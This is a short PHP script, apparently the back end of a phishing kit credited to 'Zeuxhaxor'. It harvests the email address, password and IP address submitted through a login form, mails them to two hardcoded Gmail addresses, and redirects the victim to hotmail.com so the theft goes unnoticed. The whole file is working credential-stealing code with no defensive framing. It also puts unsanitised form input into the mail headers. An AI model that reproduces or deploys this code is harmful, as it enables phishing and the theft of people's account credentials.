<?   

$ip = getenv("REMOTE_ADDR");
$message .= "Email : ".$_POST['email']."\n";
$message .= "E-Pass : ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$message .= "------------------ Created By Zeuxhaxor --------------------\n";
$send = "powellwater2skull@gmail.com,mtven231@gmail.com";
$subject = "haa user";
$headers = "From: Zeuxhaxor<log@Zeux.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: https://hotmail.com");
	  

?>